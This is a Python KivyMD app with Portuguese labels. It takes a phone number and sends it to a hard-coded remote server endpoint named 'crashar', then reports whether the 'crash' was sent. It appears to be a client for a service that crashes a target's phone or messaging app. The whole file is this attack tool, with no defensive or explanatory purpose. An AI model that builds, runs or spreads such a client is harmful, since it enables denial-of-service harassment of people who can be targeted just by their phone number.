from kivymd.app import MDApp
from kivy.lang import Builder
from kivy.network.urlrequest import UrlRequest

class MyApp(MDApp):
  def build(self):
    self.theme_cls.theme_style = 'Dark'
    GUI = Builder.load_file('screen.kv')
    return GUI
  
  def scrap(self):
    self.req = UrlRequest(f'http://20.206.88.211/apicaveiraofc.php?crashar={self.root.ids["numero"].text}', self.res)

  def res(self,*args):
    print(self.req.result)

    if 'Crash enviado com sucesso' in self.req.result:
      self.root.ids['status_crash'].text = 'Status: Crash enviado com sucesso!'
    else:
      self.root.ids['status_crash'].text = 'Status: Ocorreu algum erro!'
    
    self.root.ids['btn_crashar'].disabled = False

  def crashar(self):
    numero = self.root.ids['numero'].text
    
    if numero == '':
      self.root.ids['status_crash'].text = 'Status: Insira um NÚMERO!'
      return False

    self.root.ids['btn_crashar'].disabled = True
    self.root.ids['status_crash'].text = 'Status: Tentando crashar...'
    self.scrap()

if __name__ == '__main__':
  MyApp().run()
